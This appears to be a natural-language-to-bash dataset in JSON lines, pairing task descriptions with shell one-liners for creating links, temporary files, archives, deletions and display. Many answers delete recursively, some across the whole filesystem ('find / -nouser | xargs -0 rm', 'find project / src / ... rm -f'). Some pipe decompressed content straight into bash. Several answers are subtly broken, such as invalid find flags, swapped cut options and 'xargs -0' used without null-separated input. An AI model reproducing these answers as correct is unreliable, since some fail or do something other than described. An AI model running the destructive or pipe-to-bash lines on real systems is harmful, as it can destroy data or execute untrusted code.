{"input": "Create compressed archive of all the files in the current directory tree that have been modified in the last 7 days", "answer": "find . -type f -mtime -7 -print -exec cat {} \\; | tar cf - | gzip -9"}
{"input": "Create hard links of all files and directories matching \"test/icecream/cupcake/*\" or \"test/mtndew/livewire/*\" in \"test-keep\" preserving directory hierarchy", "answer": "find test -path 'test/icecream/cupcake/*' -o -path 'test/mtndew/livewire/*' | cpio -padluv test-keep"}
{"input": "Create links for all files in the current directory tree that are more than 1000 days old in \"/home/user/archives\"", "answer": "find . -type f -mtime +1000 -print0 | cpio -dumpl0 /home/user/archives"}
{"input": "Create master SSH control socket \"my-ctrl-socket\" in the background with no terminal or command execution with connection forwarding from localhost port 50000 to localhost port 3306 via \"jm@sampledomani.com\"", "answer": "ssh -M -S my-ctrl-socket -fnNT -L 50000:localhost:3306 jm@sampledomain.com"}
{"input": "Create new crontab set for user 'test' including $job and only jobs from current crontab of 'test' user that don`t contain $command", "answer": "cat <(fgrep -i -v \"$command\" <(crontab -u test -l)) <(echo \"$job\") | crontab -u test -"}
{"input": "Create new crontab set including $job and only jobs from current crontab that don`t contain $command", "answer": "cat <(fgrep -i -v \"$command\" <(crontab -l)) <(echo \"$job\") | crontab -"}
{"input": "Create symbolic link \"$1/link\" to the absolute path of \"$2\"", "answer": "ln -s \"$(readlink -e \"$2\")\" \"$1/link\""}
{"input": "Create symbolic links in current directory for all files located in \"dir\" directory and have filename extension \"jpg\"", "answer": "find dir -name '*.jpg' -exec ln -s \"{}\" \\;"}
{"input": "Create symbolic links in the current directory for all files excluding \"CONFIGFILE\" located in \"/your/project\"", "answer": "find /your/project -maxdepth 1 ! -name \"CONFIGFILE\" -exec ln -s \\{\\} ./ \\;"}
{"input": "Create symbolic links in the current directory for all files excluding \"CONFIGFILE\" located under \"/your/project\" directory tree", "answer": "find /your/project -type f ! -name 'CONFIGFILE' -exec ln -s \\{\\} ./ \\;"}
{"input": "Create symbolic links in the current directory for all files located in directory \"/path/with/files\" with a name containing \"txt\"", "answer": "find /path/with/files -type f -name \"*txt*\" -exec ln -s {} . ';'"}
{"input": "Create symbolic links in the current directory for all files under \"bar1\" that are not directories and do not end in \".cc\"", "answer": "find bar1 -name '*foo*' -not -type d -not -name '*.cc' -exec ln -s $PWD/'{}' bar2/ \\;"}
{"input": "Create symlinks to all  /home/folder1/*.txt files and 'folder1_' directory with the same name in a target directory named '+'", "answer": "find /home/folder1/*.txt -type f -exec ln -s {} \"folder1_\" +\\;"}
{"input": "Create symlinks to all  /home/folder1/*.txt files and 'folder2_' directory with the same name in a target directory named '+'", "answer": "find /home/folder1/*.txt -type f -exec ln -s {} \"folder2_\" + \\;"}
{"input": "Create symlinks to all  /home/folder1/*.txt files with the same name in current directory", "answer": "find /home/folder1/*.txt -type f -exec ln -s {} \\;"}
{"input": "Create symlinks to all  /home/folder2/*.txt files with the same name in current directory", "answer": "find /home/folder2/*.txt -type f -exec ln -s {} \\;"}
{"input": "Create tar archive \"dirall.tar\" and copy all files from directory tree /tmp/a1 to it", "answer": "find /tmp/a1 -exec tar -rvf dirall.tar {} \\;"}
{"input": "Create tar archive \"foo.tar\" and copy all files from directory tree /tmp/a1 to it", "answer": "find /tmp/a1 | xargs tar cvf foo.tar"}
{"input": "Create the directory '.npm-packages' in the user's home directory($HOME)", "answer": "mkdir \"${HOME}/.npm-packages\""}
{"input": "Creates 5-letter random file name and saves it in 'rand_str' variable", "answer": "rand_str=\"$(mktemp --dry-run XXXXX)\""}
{"input": "Creates alias for network interface 'eth0' with IP address '192.0.2.55' and network mask '255.255.255.255'", "answer": "ifconfig eth0:fakenfs 192.0.2.55 netmask 255.255.255.255"}
{"input": "Creates path as current folder path and folder that contains $0 file, and saves result in 'script_dir' variable", "answer": "set script_dir = `pwd`/`dirname $0`"}
{"input": "Creates random file name formatted like expression in variable ${str// /X} and saves it in 'rand_str' variable", "answer": "rand_str=$(mktemp --dry-run ${str// /X})"}
{"input": "Creates temporary directory with name formatted like .daemonXXXXXXX in /tmp/ folder, and saves path to it in 'TMPDIR' variable", "answer": "TMPDIR=$(mktemp -p /tmp -d .daemonXXXXXXX)"}
{"input": "Creates temporary file by template provided in option '-t'", "answer": "mktemp -t identifier.XXXXXXXXXX"}
{"input": "Creates temporary file in $appdir variable with name formatted like expression in variable ${template}, and saves path to it in 'launcherfile' variable", "answer": "launcherfile=$(mktemp -p \"$appdir\" \"$template\")"}
{"input": "Creates temporary file in TMPDIR folder or /tmp/ if TMPDIR is not defined, named by template ${tempname}.XXXXXX, and saves path to new file in  a TMPPS_PREFIX variable", "answer": "TMPPS_PREFIX=$(mktemp \"${TMPDIR:-/tmp/}${tempname}.XXXXXX\")"}
{"input": "Creates temporary file in a TMPDIR folder or /tmp folder if TMPDIR doesn`t defined, with file name like current shell name and '-XXXXX'-formatted suffix, and saves created path to the 'tempFile' variable", "answer": "tempFile=\"$(mktemp \"${TMPDIR:-/tmp/}$(basename \"$0\")-XXXXX\")\""}
{"input": "Creates temporary file in a current folder and saves path to it in 'f' variable", "answer": "f=`mktemp -p .`"}
{"input": "Creates temporary file in a current folder with name formatted like 'templateXXXXXX', and saves path to it in 'tempfile' variable", "answer": "tempfile=$(mktemp $(pwd)/templateXXXXXX)"}
{"input": "Creates temporary file with name formatted like expression in variable ${PROG}, and saves path to it in 'mytemp' variable", "answer": "mytemp=\"$(mktemp -t \"${PROG}\")\""}
{"input": "Creates temporary file, replacing XXXXXXXXXXXXXXXXXXXXXXX with equal length suffix", "answer": "mktemp /tmp/banana.XXXXXXXXXXXXXXXXXXXXXXX.mp3"}
{"input": "Creates temporary folder in /tmp/ (by default) with 10-letter suffux", "answer": "mktemp -d -t"}
{"input": "Creates temporary folder in TMPDIR (if defined) or in '/tmp/', and stores path to created folder in 'tmpdir' variable", "answer": "tmpdir=$(mktemp -d)"}
{"input": "Creates temporary folder in a $temp_dir folder with name pattern defined by $template, and stores path to created folder in 'my_temp' variable", "answer": "$ my_temp_dir=$(mktemp -d --tmpdir=$temp_dir -t $template)"}
{"input": "Creates temporary folder in a TMPDIR folder or /tmp folder if TMPDIR doesn`t defined, with folder name like current shell name and 10-letter suffix, and saves created path in 'mydir' variable", "answer": "mydir=$(mktemp -d \"${TMPDIR:-/tmp/}$(basename $0).XXXXXXXXXXXX\")"}
{"input": "Creates temporary folder within TMPDIR, with name like current shell name and 10-letter suffix", "answer": "mktemp -dt \"$(basename $0).XXXXXXXXXX\""}
{"input": "Creates temporary folder within a $mnt_dir folder and saves path to it in a 'rsync_src' variable", "answer": "rsync_src=`mktemp -d -p $mnt_dir`"}
{"input": "Cut all remote paths from HTTP URLs received from standard input (one per line) keeping only the protocol identifier and host name, of the form http://example.com", "answer": "sed -n 's;\\(http://[^/]*\\)/.*;\\1;p'"}
{"input": "Cut all remote paths from HTTP URLs received from standard input (one per line) keeping only the protocol identifier, host name, and trailing slash, of the form http://example.com/", "answer": "sed -n 's;\\(http://[^/]*/\\).*;\\1;p'"}
{"input": "Cuts off last part from the path $dir, and deletes resulted folder if empty", "answer": "rmdir \"$(dirname $dir)\""}
{"input": "Cuts off last two parts from the path $dir, and deletes resulted folder if empty", "answer": "rmdir \"$(dirname $(dirname $dir))\""}
{"input": "Decompress \"/file/address/file.tar.gz\" to standard output", "answer": "gzip -dc /file/address/file.tar.gz"}
{"input": "Decompress \"file2.txt\" and \"file1.txt\" and print lines in \"file1.txt\" that match the 5th tab separated field in \"file2.txt\"", "answer": "awk -F'\\t' 'NR==FNR{a[$5];next} $5 in a' <(zcat file2.txt) <(zcat file1.txt)"}
{"input": "Decompress \"path/to/test/file.gz\" to standard output and save all lines matching \"my regex\" and not matching \"other regex\" to files with a 1000000 line limit", "answer": "gzip -dc path/to/test/file.gz | grep -P 'my regex' | grep -vP 'other regex' | split -dl1000000 - file"}
{"input": "Decompress \"path/to/test/file.gz\" to standard output and save all lines matching \"my regex\" to files with a 1000000 line limit", "answer": "gzip -dc path/to/test/file.gz | grep -P --regexp='my regex' | split -dl1000000 - file"}
{"input": "Decompress 'file.gz' to standard output and execute the output in bash", "answer": "gzip -d --stdout file.gz | bash"}
{"input": "Decompress and extract '/usr/src/redhat/SOURCES/source-one.tar.gz'", "answer": "gzip -dc /usr/src/redhat/SOURCES/source-one.tar.gz | tar -xvvf -"}
{"input": "Decompress and sort \"$part0\" and \"$part1\" of files in different processes", "answer": "sort -m <(zcat $part0 | sort) <(zcat $part1 | sort)"}
{"input": "Decompresses each of \"*bz2\" files under the current folder, redirecting output to the standard out, and prints only fourth of comma-separated fields", "answer": "find . -name \"*.bz2\" -print0 | xargs -I{} -0 bzip2 -dc {} | cut -f, -d4"}
{"input": "Decompresses file", "answer": "bzip2 -d /tmp/itunes20140618.tbz"}
{"input": "Delete all '-' character from $1 and save the resultant string to variable 'COLUMN'", "answer": "COLUMN=`echo $1 | tr -d -`"}
{"input": "Delete all 'restore.php' files in /var/www and 3 levels below", "answer": "find /var/www -maxdepth 4 -name 'restore.php' -exec rm -r {} \\;"}
{"input": "Delete all *.zip files under current directory that are older than 2 days", "answer": "find . -name \"*.zip\" -mtime +2 -print0 | xargs -0 -I {} rm {}"}
{"input": "Delete all *txt files under current directory", "answer": "find . -name \"*txt\" -type f -print | xargs rm"}
{"input": "Delete all .bam files in the current directory tree", "answer": "find . -name \"*.bam\" | xargs rm"}
{"input": "Delete all .pyc files in the current directory tree", "answer": "find . -name \"*.pyc\" | xargs -0 rm -rf"}
{"input": "Delete all .svn directories under current directory", "answer": "find . -type d -name .svn -print0|xargs -0 rm -rf"}
{"input": "Delete all .svn files/directories under current directory", "answer": "find . -depth -name .svn -exec rm -fr {} \\;"}
{"input": "Delete all .svn subdirectories under current directory", "answer": "rm -rf `find . -type d -name \".svn\"`"}
{"input": "Delete all 1US* (case insensitive) files under current directory", "answer": "find . -iname \"1US*\" -exec rm {} \\;"}
{"input": "Delete all HTML files under tree ~/mydir", "answer": "find ~/mydir -iname '*.htm' -exec rm {} \\;"}
{"input": "Delete all MP3 files under /tmp", "answer": "find /tmp -iname '*.mp3' -print0 | xargs -0 rm"}
{"input": "Delete all __temp__* directories under maximum 1 level down the current directory tree", "answer": "find . -maxdepth 1 -type d -name '__temp__*' -print0 | xargs -0 rm -rf"}
{"input": "Delete all __temp__* files/directories under current directory tree", "answer": "find . -depth -name '__temp__*' -exec rm -rf '{}' \\;"}
{"input": "Delete all broken symbolic links under '/usr/ports/packages' directory tree", "answer": "find -L /usr/ports/packages -type l -exec rm -- {}\t+"}
{"input": "Delete all but the most recent 5 files", "answer": "ls -tr | head -n -5 | xargs rm"}
{"input": "Delete all contents form the files that contain the case insensitive regex 'stringtofind' in maximum 1 level down the / directory excluding other partitions", "answer": "find / -maxdepth 1 -xdev -type f -exec grep -i \"stringtofind\" -l {} \\; -exec sed -i '/./d' {} \\;"}
{"input": "Delete all directories found in $LOGDIR that are more than a work-week old", "answer": "find $LOGDIR -type d -mtime +5 -exec rm -rf {} \\;"}
{"input": "Delete all directories in the /myDir directory tree", "answer": "find /myDir -type d -delete"}
{"input": "Delete all directories in the TBD directory that were modified more than 1 day ago", "answer": "find /TBD -mtime +1 -type d | xargs rm -f -r"}
{"input": "Delete all directories under '.cache/chromium/Default/Cache' directory tree that are at least 1 level deep and are bigger than 100 MB in size", "answer": "find .cache/chromium/Default/Cache/ -mindepth 1 -type d -size +100M -delete"}
{"input": "Delete all directories under '.cache/chromium/Default/Cache/' directory tree that are bigger than 100MB and are at least 1 level deep", "answer": "find .cache/chromium/Default/Cache/ -mindepth 1 -type d -size +100M -exec rm -rf {} \\;"}
{"input": "Delete all empty directories in minimum 1 level down the directory 'directory'", "answer": "find directory -mindepth 1 -type d -empty -delete"}
{"input": "Delete all empty directories in minimum 2 levels down the root directory", "answer": "find root -mindepth 2 -type d -empty -delete"}
{"input": "Delete all empty directories under root", "answer": "find root -type -d -empty -delete"}
{"input": "Delete all empty directories under test directory", "answer": "find test -depth -type d -empty -delete"}
{"input": "Delete all empty files/directories under test directory", "answer": "find test -depth -empty -delete"}
{"input": "Delete all empty subdirectories in and below directory/", "answer": "find directory -mindepth 1 -type d -empty -delete"}
{"input": "Delete all files (files, directories, links, pipes...) named 'core' under current directory", "answer": "find . -name \"core\" -exec rm -f {} \\;"}
{"input": "Delete all files and directories", "answer": "find -delete"}
{"input": "Delete all files beneath the current directory that begin with the letters 'Foo'", "answer": "find . -type f -name \"Foo*\" -exec rm {} \\;"}
{"input": "Delete all files in directory $DIR that have not been accessed in at least 5 days", "answer": "find \"$DIR\" -type f -atime +5 -exec rm {} \\;"}
{"input": "Delete all files in the \"${S}/bundled-libs\" folder except \"libbass.so\"", "answer": "find \"${S}/bundled-libs\" \\! -name 'libbass.so' -delete"}
{"input": "Delete all files in the $DIR directory that have not been accessed in 5 or more days", "answer": "find \"$DIR\" -type f -atime +5 -exec rm {} \\;"}
{"input": "Delete all files in the /TBD directory that were modified more than 1 day ago", "answer": "find /TBD/* -mtime +1 -exec rm -rf {} \\;"}
{"input": "Delete all files in the /myDir directory tree that were last modfied 7 days ago", "answer": "find /myDir -mindepth 1 -mtime 7 -delete"}
{"input": "Delete all files in the /myDir directory tree that were last modfied more than 7 days ago", "answer": "find /myDir -mindepth 1 -mtime +7 -delete"}
{"input": "Delete all files in the /myDir directory tree that were last modified 7 days ago", "answer": "find /myDir -mtime 7 -exec rm -rf {} \\;"}
{"input": "Delete all files in the TBD directory that were modified more than 1 day ago", "answer": "find /TBD/* -mtime +1 | xargs rm -rf"}
{"input": "Delete all files in the current directory", "answer": "find . -exec /bin/rm {} \\;"}
{"input": "Delete all files in the current user's home directory and its sub-directories that have not been accessed for more than 100 days", "answer": "find ~ -atime +100 -delete"}
{"input": "Delete all files named \"filename\" in the current directory tree, except the one with path ./path/to/filename", "answer": "find . -name \"filename\" -and -not -path \"./path/to/filename\" -delete"}
{"input": "Delete all files named \"filename\" in the current directory tree, except those with paths ending in \"/myfolder/filename\"", "answer": "find . -name \"filename\" -and -not -path \"*/myfolder/filename\" -delete"}
{"input": "Delete all files named '-F' under current directory tree", "answer": "find . -name \"-F\" -exec rm {} \\;"}
{"input": "Delete all files named 'Waldo' under ~/Books directory tree where '~' expands to user's home directory", "answer": "find ~/Books -type f -name Waldo -exec rm {} \\;"}
{"input": "Delete all files named 'sample' (case insensitive) under '/home/user/Series' directory tree with superuser privilege", "answer": "sudo find /home/user/Series/ -iname sample -exec rm {} \\;"}
{"input": "Delete all files not owned by valid users", "answer": "find / -nouser | xargs -0 rm"}
{"input": "Delete all files throughout the entire filesystem that are no longer owned by a valid user", "answer": "find / -nouser | xargs -0 rm"}
{"input": "Delete all files under $INTRANETDESTINATION/monthly directory tree that were modified more than 366 days ago", "answer": "find $INTRANETDESTINATION/monthly -mtime +366 -exec rm {} \\;"}
{"input": "Delete all files under $INTRANETDESTINATION/weekly directory tree that were modified more than 32 days ago", "answer": "find $INTRANETDESTINATION/weekly -mtime +32 -exec rm {} \\;"}
{"input": "Delete all files under '/home/backups' directory tree with '.tgz' or '.gz' extension (case insensitive) that were modified more thant 60 days ago", "answer": "find /home/backups -type f -iregex '.*\\.t?gz$' -mtime +60 -exec rm {} \\;"}
{"input": "Delete all files under /path/to/files that are not newer than dummyfile", "answer": "find /path/to/files -type f ! -newer dummyfile -delete"}
{"input": "Delete all files under /path/to/input/ that match the case insensitive string literal 'spammer@spammy.com' in their contents", "answer": "find /path/to/input/ -type f -exec grep -qiF spammer@spammy.com \\{\\} \\; -delete"}
{"input": "Delete all files under and below the current directory", "answer": "find -mindepth 1 -delete"}
{"input": "Delete all files under current directory tree with '.$1' extension where $1 expands as the first positional parameter", "answer": "find . -name \"*.$1\" -exec rm {} \\;"}
{"input": "Delete all files under root whose status were changed more than 30 minutes ago", "answer": "find root -type -f -cmin +30 -delete"}
{"input": "Delete all files under user's home directory tree that were accessed more than 365 days after their status was changed", "answer": "find ~ -used +365 -ok rm '{}' ';'"}
{"input": "Delete all files with ' .o' extension in the entire filesystem", "answer": "find project / src / -name \"* .o\" -exec rm -f {} \\;"}
{"input": "Delete all files with 128128 inode number under current directory tree", "answer": "find . -inum 128128 | xargs rm"}
{"input": "Delete all files with indoe number $inum under current directory tree", "answer": "find . -inum $inum -exec rm {} \\;"}
{"input": "Delete all files with inode number 804180", "answer": "find -inum 804180 -exec rm {} \\"}
{"input": "Delete all files/directories in minimum 2 levels down the root directory", "answer": "find root -mindepth 2 -delete"}
{"input": "Delete all files/directories named 'FILE-TO-FIND' under current directory tree", "answer": "find . -name \"FILE-TO-FIND\" -exec rm -rf {} \\;"}
{"input": "Delete all files/directories named 'file' under current directory tree", "answer": "find -name file -delete"}
{"input": "Delete all files/directories named 'sample' (case insensitive) under '/home/user/Series/' directory tree as super user", "answer": "sudo find /home/user/Series/ -iname sample -print0 | sudo xargs -0 rm -r"}
{"input": "Delete all files/directories named test under maximum 2 level down the current directory", "answer": "find . -maxdepth 2 -name \"test\" -exec rm -rf {} \\;"}
{"input": "Delete all files/directories older than 48 hours in /path/to/files* paths", "answer": "find /path/to/files* -mtime +2 -delete"}
{"input": "Delete all files/directories taken by the glob pattern * except the ones with the name 'b'", "answer": "find * -maxdepth 0 -name 'b' -prune -o -exec rm -rf '{}' ';'"}
{"input": "Delete all files/directories under current directory", "answer": "find -delete"}
{"input": "Delete all files/directories under current directory tree excluding '.gitignore' files/directories and files/directories matching the patterns '.git' or '.git/*' in their paths", "answer": "find . ! -name '.gitignore' ! -path '.git' ! -path '.git/*' -exec rm -rf {} \\;"}
{"input": "Delete all files/directories with '.old' extension under current directory tree", "answer": "find . -name '*.old' -delete"}
{"input": "Delete all files/directories with inode number 117672808 under current directory tree", "answer": "find -inum 117672808 -exec rm {} \\;"}
{"input": "Delete all files/directories with node number $inum under current directory tree", "answer": "find . -inum $inum -exec rm {} \\"}
{"input": "Delete all hard links to the physical file with inode number 2655341", "answer": "find /home -xdev -inum 2655341 | xargs rm"}
{"input": "Delete all in the current directory tree", "answer": "find . -delete"}
{"input": "Delete all lines matching \"some string here\" in \"yourfile\"", "answer": "sed --in-place '/some string here/d' yourfile"}
{"input": "Delete all matches to the regex '^.*iframe bla bla bla.*$' in all the php files under current directory tree and modify the files in-place", "answer": "find ./ -type f -name \\*.php -exec sed -i 's/^.*iframe bla bla bla.*$//g' {} \\;"}
{"input": "Delete all non digits from index \"$i\" in bash array \"depsAlastmodified\" and print the hex dump as characters", "answer": "echo \"${depsAlastmodified[$i]}\" | tr -cd '[[:digit:]]' | od -c"}
{"input": "Delete all regular files named 'FILE-TO-FIND' under current directory tree", "answer": "find . -type f -name \"FILE-TO-FIND\" -exec rm -f {} \\;"}
{"input": "Delete all regular files named 'FindCommandExamples.txt' under current directory tree", "answer": "find . -type f -name \"FindCommandExamples.txt\" -exec rm -f {} \\;"}
{"input": "Delete all regular files named 'IMAG1806.jpg' under current directory tree", "answer": "find . -type f -name \"IMAG1806.jpg\" -exec rm -f {} \\;"}
{"input": "Delete all regular files that have not been modified in the last 60 weeks under $DIR directory tree", "answer": "find $DIR -type f -mtime +60w -exec rm {} \\;"}
{"input": "Delete all regular files that start with 'sess_' in their names, are at least 1 level deep and were modified more than $gc_maxlifetime minutes ago under $save_path directory tree", "answer": "find -O3 \"$save_path\" -depth -mindepth 1 -name 'sess_*' -ignore_readdir_race -type f -cmin \"+$gc_maxlifetime\" -delete"}
{"input": "Delete all regular files under $DIR directory tree that have been modified before file $a", "answer": "find \"$DIR\" -type f \\! -newer \"$a\" -exec rm {} +"}
{"input": "Delete all regular files under current directory", "answer": "find . -type f -print0 | xargs -0 /bin/rm"}
{"input": "Delete all regular files with '.cache' extension that were accessed more than 30 days ago under $HOME/Library/Safari/Icons directory tree", "answer": "find $HOME/Library/Safari/Icons -type f -atime +30 -name \"*.cache\" -print -delete"}
{"input": "Delete all the files found in the current directory tree whose names begin with \"heapdump\"", "answer": "find . -name heapdump* -exec rm {} \\ ;"}
{"input": "Delete characters in columns 36 through 40 from the output of \"finger\"", "answer": "finger |  cut --complement -c36-40"}
{"input": "Delete current cron job list, and use those in yourFile.text", "answer": "crontab yourFile.text"}
{"input": "Delete empty files and print their names", "answer": "find . -empty -delete -print"}
{"input": "Delete every second line from output of \"seq 10\"", "answer": "seq 10 | sed '0~2d'"}
{"input": "Delete everything in the current directory", "answer": "find -mindepth 1 -maxdepth 1 -print0 | xargs -0 rm -rf"}
{"input": "Delete file with inode number 314167125", "answer": "find . -type f -inum 314167125 -delete"}
{"input": "Delete files \"*doc copoy\" in directory tree /mnt/zip", "answer": "find /mnt/zip -name \"*doc copy\" -execdir rm \"{}\" \\;"}
{"input": "Delete files containing whitespaces", "answer": "find . -name \"* *\" -exec rm -f {} \\;"}
{"input": "Delete files containing whitespaces without recursion", "answer": "find . -name '*[+{;\"\\\\=?~()<>&*|$ ]*' -maxdepth 0 -exec rm -f '{}' \\;"}
{"input": "Delete files in $DIR_TO_CLEAN older than $DAYS_TO_SAVE days", "answer": "find \"$DIR_TO_CLEAN\" -mtime +$DAYS_TO_SAVE -exec rm {} \\;"}
{"input": "Delete files in the DIR directory tree whose names begin with \"2015\" and contain \"album\" or \"picture\"", "answer": "find DIR \\( -name 2015\\* -a \\( -name \\*album\\* -o -name \\*picture\\* \\) \\) -delete"}
{"input": "Delete files older than 31 days", "answer": "find ./ -mtime +31 -delete"}
{"input": "Delete files under $LOCATION that match $REQUIRED_FILES in their names and were modified more than 1 day ago", "answer": "find $LOCATION -name $REQUIRED_FILES -type f -mtime +1 -delete"}
{"input": "Delete files with inode number 782263 under current directory", "answer": "find . -inum 782263 -exec rm -i {} \\;"}
{"input": "Delete files with inode number specified by [inode-number] under current directory", "answer": "find . -inum [inode-number] -exec rm -i {} \\;"}
{"input": "Delete in the background all files in /var/tmp/stuff1 and below that have not been modified in over 90 days", "answer": "find /var/tmp/stuff1 -mtime +90 -delete &"}
{"input": "Delete line 2 in numbered file \"file\" and renumber", "answer": "grep -v '^2 ' file | cut -d' ' -f2- | nl -w1 -s' '"}
{"input": "Delete recursively empty files named 'bad'", "answer": "find . -name bad -empty -delete"}
{"input": "Delete the 4th tab separated column from the output of \"finger\"", "answer": "finger | awk -F\"\\t\" -v 'OFS=\\t' '{ $4=\"\"; print $0}' | sed 's/\\t\\{2,\\}/\\t/'"}
{"input": "Delete the files under the current working directory with inode numbers specified on standard input", "answer": "xargs -n 1 -I '{}' find \"$(pwd)\" -type f -inum '{}' -delete"}
{"input": "Delete the oldest file with '.tgz' or '.gz' extension under '/home/backups' directory tree", "answer": "ls -tr $(find /home/backups -name '*.gz' -o -name '*.tgz')|head -1|xargs rm -f"}
{"input": "Delete the text matched by the regex '<script>if(window.*<\\/script>' in all index.html files under current directory", "answer": "find index.html | xargs -rt sed -i 's/<script>if(window.*<\\/script>//g'"}
{"input": "Deletes folder like /tmp/*/* or deeper, older than +7 days if they don`t contain files or other folders", "answer": "find /tmp/*/* -mtime +7 -type d -exec rmdir {} \\;"}
{"input": "Delimit standard input with \":\" and display as a table", "answer": "column -s: -t"}
{"input": "Descend into every directory under /etc and print the file/directory names with relative paths", "answer": "find /etc -execdir echo \"{}\" ';'"}
{"input": "Determine DISPLAY variable for the session when logged in via SSH", "answer": "who am i | awk '{print $5}' | sed 's/[()]//g' | cut -f1 -d \".\" | sed 's/-/./g'"}
{"input": "Determine the user associated with stdin", "answer": "who -m"}
{"input": "Discard the first letter from every line in $line and calculate the md5 sum of the remaining", "answer": "echo $line | cut -c2- | md5sum"}
{"input": "Display \"/tmp/file\" as a table of width 30 with columns filled before rows", "answer": "column -x -c 30 /tmp/file"}
{"input": "Display \"infile\" as printable characters or backslash escapes", "answer": "cat infile | od -c"}
{"input": "Display a binary file as a sequence of hex codes", "answer": "od -t x1 file|cut -c8-"}
{"input": "Display a count of regular files in each directory at the current level", "answer": "find -P . -type f | rev | cut -d/ -f2- | rev | cut -d/ -f1-2 | cut -d/ -f2- | sort | uniq -c"}
{"input": "Display a list of files with sizes in decreasing order of size of all the regular files under $dir directory tree that are bigger than $size in size", "answer": "find $dir -type -f size +$size -print0 | xargs -0 ls -1hsS"}
{"input": "Display a list of files with sizes in decreasing order of size of all the regular files under '/your/dir' directory tree that are bigger than 5 MB in size", "answer": "find /your/dir -type f -size +5M -print0 | xargs -0 ls -1Ssh"}
{"input": "Display a named character dump of \"test.sh\"", "answer": "od -a test.sh"}
{"input": "Display a sorted count of all the characters in \"filename\"", "answer": "fold -w1 filename | sort | uniq -c | sort -nr"}
{"input": "Display all environment variables, functions, and aliases, pausing for user interaction after each page of output", "answer": "set | more"}
{"input": "Display all files in a folder", "answer": "find /usr/X11/man/man5 -print"}
{"input": "Display all files in the current directory tree that match \"*foo\"", "answer": "tree -P \"*foo\""}
{"input": "Display all lines contained in 'dax-weekly.csv' in reverse order", "answer": "cat dax-weekly.csv | awk '{a[i++]=$0} END {for (j=i-1; j>=0;) print a[j--] }'"}
{"input": "Display all lines contiaining 'funcname' in system map file matching current kernel", "answer": "cat /boot/System.map-`uname -r` | grep funcname"}
{"input": "Display all lines in 'file' containing 'something', pausing for user input after each page", "answer": "grep something file | more"}
{"input": "Display all regular files under current directory tree ignoring files in './dir1' and './dir2' directories", "answer": "find . -type f |sed '/.\\/dir[12]\\/[^/]*$/d'"}
{"input": "Display all symlinks and their targets in the current directory", "answer": "find -P .  -maxdepth 1 -type l -exec echo -n \"{} -> \" \\; -exec readlink {} \\;"}
{"input": "Display all symlinks and their targets in the current directory tree", "answer": "find -P . -type l -exec echo -n \"{} -> \" \\; -exec readlink {} \\;"}
{"input": "Display all variables with names starting with \"derby\" in a Window's command line", "answer": "set derby"}
{"input": "Display an amount of processes running with a certain name", "answer": "ab=`ps -ef | grep -v grep | grep -wc processname`"}
{"input": "Display an infinite number of lines consisting of \"y\", until the user presses the Q key", "answer": "yes | cat | more"}
{"input": "Display bash function definition of \"foobar\"", "answer": "set | grep -A999 '^foobar ()' | grep -m1 -B999 '^}'"}
{"input": "Display current system's kernel name, kernel release and version, and machine architecture", "answer": "uname -srvm"}
{"input": "Display environment variable \"_\" of the current shell", "answer": "set | grep \"^_=\""}
{"input": "Display file type information for all instances of \"file\" in the current PATH", "answer": "which file | xargs file"}
{"input": "Display hardware platform, ie. x86_64 even if current kernel uses 32-bit addressing", "answer": "uname -i"}
{"input": "Display infinite scroll of random ASCII art", "answer": "yes 'c=(\u2571 \u2572);printf ${c[RANDOM%2]}'|bash"}
{"input": "Display inputfile all on one line (replace newlines by spaces)", "answer": "awk '{printf \"%s \", $0} END {printf \"\\n\"}' inputfile"}
{"input": "Display kernel name, release, and version", "answer": "uname -s -r -v"}
{"input": "Display last 100 lines of file-with-line-too-long.txt, waiting for user input after each page", "answer": "tail -1000 file-with-line-too-long.txt | more"}
{"input": "Display list of files ending with '.txt' in the current folder to the terminal twice and output it to the text file \"txtlist.txt\"", "answer": "ls *.txt | tee /dev/tty txtlist.txt"}
{"input": "Display mime type of file specified by variable \"file\"", "answer": "file -ib \"$file\""}
{"input": "Display name and value of 'variable' if it exists", "answer": "env | grep '^variable='"}
{"input": "Display non-hidden files in the current directory with the given output format", "answer": "find . -maxdepth 1 -name '[!.]*' -printf 'Name: %16f Size: %6s\\n'"}
{"input": "Display only first and second dot-separated numbers of kernel version, ie. 4.4", "answer": "uname -r | cut -d. -f1-2"}
{"input": "Display only line numbers listed in 'file_of_line_numbers\" from file 'source'", "answer": "sed 's/$/p/' file_of_line_numbers | sed -nf - source"}
{"input": "Display only mimetype of myfile.txt, without the filename", "answer": "file -bi myfile.txt"}
{"input": "Display source and mount point of the file system containing /some/path", "answer": "df '/some/directory' | awk '{print $1, $6}'"}
{"input": "Display standard input as a table with \"${tab}\" separators", "answer": "column -s\"${tab}\" -t"}
{"input": "Display standard input as octal bytes", "answer": "cat | od -b"}
{"input": "Display standard input as printable characters or backslash escapes with no addressing radix", "answer": "od -cAn;"}
{"input": "Display top 500 mp4 and flv files under current directory along with their timestamps in the sorted order of time", "answer": "find . -regex \".*\\.\\(flv\\|mp4\\)\" -type f -printf '%T+ %p\\n' | sort | head -n 500"}
{"input": "Display total apparent size of a file", "answer": "du -sb"}
{"input": "Display variable 'var' without leading and trailing whitespace", "answer": "echo $var | awk '{gsub(/^ +| +$/,\"\")}1'"}
{"input": "Display what flags mount points are mounted with", "answer": "mount -l"}
{"input": "Displays information about all network interfaces in system, including inactive ones", "answer": "ifconfig -a"}
{"input": "Displays process tree of a process with id 'PID', showing parent process and processes id", "answer": "pstree -p -s PID"}
{"input": "Displays status of currently active network interfaces", "answer": "ifconfig"}
{"input": "Do a dry run of renaming file extension '.andnav' to '.tile' for all files/directories under current directory tree", "answer": "find . -name \"*.andnav\" | rename -vn \"s/\\.andnav$/.tile/\""}
{"input": "Do not mark variables and function which are modified or created for export to the environment of subsequent commands", "answer": "set +a"}
{"input": "Download \"Louis Theroux's LA Stories\" using rsync over ssh", "answer": "rsync -ave ssh '\"Louis Theroux\"''\"'\"'\"'\"''\"s LA Stories\"'"}
{"input": "Download \"http://archive.ubuntu.com/ubuntu/pool/universe/s/splint/splint_3.1.2.dfsg1-2.diff.gz\", unzip it, and view the output in \"less\"", "answer": "curl -s 'http://archive.ubuntu.com/ubuntu/pool/universe/s/splint/splint_3.1.2.dfsg1-2.diff.gz' | gunzip -dc | less"}
{"input": "Dry run making directories in \"/TARGET_FOLDER_ROOT/\" for each \".mov\" file in the current directory tree", "answer": "find . -type f -iname \\*.mov -printf '%h\\n' | sort | uniq | xargs -n 1 -d '\\n' -I '{}' echo mkdir -vp \"/TARGET_FOLDER_ROOT/{}\""}
